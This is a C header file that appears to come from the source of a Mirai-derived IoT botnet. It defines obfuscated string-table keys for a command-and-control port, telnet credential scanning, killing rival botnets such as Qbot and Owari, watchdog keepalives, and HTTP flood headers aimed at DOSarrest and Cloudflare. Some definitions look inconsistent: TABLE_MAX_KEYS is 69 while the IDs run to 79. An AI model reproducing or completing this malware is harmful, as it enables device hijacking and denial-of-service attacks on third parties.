#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_CNC_PORT 1
#define TABLE_SCAN_CB_PORT 2
#define TABLE_EXEC_SUCCESS 3
#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_KILL_9 12
#define TABLE_SCAN_OGIN 13
#define TABLE_SCAN_ENTER 14
#define TABLE_SCAN_ASSWORD 15
#define TABLE_KILLER_PROC 16
#define TABLE_KILLER_EXE 17
#define TABLE_KILLER_FD 18
#define TABLE_KILLER_MAPS 19
#define TABLE_KILLER_TCP 20
#define TABLE_EXEC_MIRAI 21
#define TABLE_EXEC_SORA1 22
#define TABLE_EXEC_SORA2 23
#define TABLE_EXEC_OWARI 24
#define TABLE_EXEC_JOSHO 25
#define TABLE_EXEC_APOLLO 26
#define TABLE_EXEC_KATRINA 27
#define TABLE_EXEC_JOSHO3 28
#define TABLE_EXEC_MASUTA 29
#define TABLE_EXEC_DADDYLEET 30
#define TABLE_EXEC_ALLQBOT 31
#define TABLE_EXEC_QBOT 32
#define TABLE_EXEC_OGOWARI 33
#define TABLE_EXEC_OPOWARI 34
#define TABLE_EXEC_MIRAI2 35
#define TABLE_EXEC_QBOT2 36
#define TABLE_EXEC_DEVNULL 37
#define TABLE_EXEC_KETASHI 39
#define TABLE_EXEC_KETASHI2 40
#define TABLE_IOCTL_KEEPALIVE1 41
#define TABLE_IOCTL_KEEPALIVE2 42
#define TABLE_IOCTL_KEEPALIVE3 43
#define TABLE_IOCTL_KEEPALIVE4 44
#define TABLE_RANDOM 45
#define TABLE_ATK_VSE 46
#define TABLE_ATK_RESOLVER 47
#define TABLE_ATK_NSERV 49
#define TABLE_ATK_HTTP 70
#define TABLE_ATK_ACCEPT                50
#define TABLE_ATK_ACCEPT_LNG            51 
#define TABLE_ATK_CONTENT_TYPE          52
#define TABLE_ATK_SET_COOKIE            53 
#define TABLE_ATK_REFRESH_HDR           54  
#define TABLE_ATK_LOCATION_HDR          55 
#define TABLE_ATK_SET_COOKIE_HDR        56
#define TABLE_ATK_CONTENT_LENGTH_HDR    57
#define TABLE_ATK_TRANSFER_ENCODING_HDR 58
#define TABLE_ATK_CHUNKED               59
#define TABLE_ATK_KEEP_ALIVE_HDR        60 
#define TABLE_ATK_CONNECTION_HDR        61
#define TABLE_ATK_DOSARREST             62 
#define TABLE_ATK_CLOUDFLARE_NGINX      63 
#define TABLE_HTTP_ONE                  64
#define TABLE_HTTP_TWO                  65
#define TABLE_HTTP_THREE                66
#define TABLE_HTTP_FOUR                 67
#define TABLE_HTTP_FIVE                 68
#define TABLE_MAX_KEYS 					69
#define TABLE_ATK_KEEP_ALIVE            71
#define TABLE_SCAN_CONTENTLEN           72
#define TABLE_SCAN_CONNECTION           73
#define TABLE_SCAN_ACCEPT               74
#define TABLE_SCAN_AUTH                 75
#define TABLE_SCAN_HEADER               76
#define TABLE_SCAN_HEADER2              77
#define watchdog_pid                    78
#define TABLE_SCAN_POST                 79




void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
